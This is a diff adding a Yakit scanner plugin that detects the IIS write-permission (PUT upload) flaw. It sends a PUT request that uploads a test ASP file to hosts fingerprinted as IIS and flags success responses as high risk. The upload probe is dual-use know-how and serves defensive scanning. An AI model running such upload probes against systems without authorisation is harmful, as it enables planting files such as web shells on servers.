@@ -1,0 +1,77 @@
+# port scan plugin
+yakit.AutoInitYakit()
+log.setLevel("info")
+
+handleCheck = func(target,port){
+    addr = str.HostPort(target, port)
+    isTls = str.IsTLSServer(addr)
+
+    packet = `
+PUT /123456.txt HTTP/1.1
+Host: {{params(target)}}
+Accept: */*
+Accept-Encoding: gzip, deflate
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36
+Content-Length: 44
+
+<% response.write("test") %>`
+    rsp,req,_ = poc.HTTP(packet, 
+    poc.params({"target":addr}),
+    poc.https(isTls),
+    poc.redirectTimes(0),
+    )
+
+    drsp, derr = str.ParseBytesToHTTPResponse(rsp)
+    if derr != nil {
+        yakit.Error(string(derr))
+        return
+    }
+
+    hand, body = str.SplitHTTPHeadersAndBodyFromPacket(rsp)
+
+    // dump(rsp)
+    if len(rsp) > 0 {
+        if drsp.StatusCode == 201 {
+            yakit.Info("%v IIS 写权限漏洞", addr)
+            risk.NewRisk(
+                addr,risk.title("IIS 写权限漏洞"),
+                risk.severity("high"),
+                risk.titleVerbose("IIS 写权限漏洞"),
+                risk.type("文件上传[IIS]"),
+            )
+        }elif drsp.StatusCode == 200 && str.MatchAllOfSubString(hand, "PUT") {
+            yakit.Info("%v IIS 写权限漏洞", addr)
+            risk.NewRisk(
+                addr,risk.title("IIS 写权限漏洞"),
+                risk.severity("high"),
+                risk.titleVerbose("IIS 写权限漏洞"),
+                risk.type("文件上传[IIS]"),
+            )
+        }
+    }
+
+    return
+}
+handle = func(result /* *fp.MatchResult */) {
+    // handle match result
+    if !result.IsOpen(){
+        return
+    }
+
+    // dump(result.GetServiceName())
+    // println("-------------------------------")
+    // dump(result.GetCPEs())
+    // println("-------------------------------")
+    // dump(result.GetDomains())
+    // println("-------------------------------")
+    // dump(result.GetHtmlTitle())
+    // println("-------------------------------")
+    // dump(result.GetProto())
+
+    if len(result.Fingerprint.HttpFlows)>0{
+        if str.MatchAllOfSubString(result.GetServiceName(), "IIS") {
+            handleCheck(result.Target,result.Port)  
+        }
+    }
+    
+}
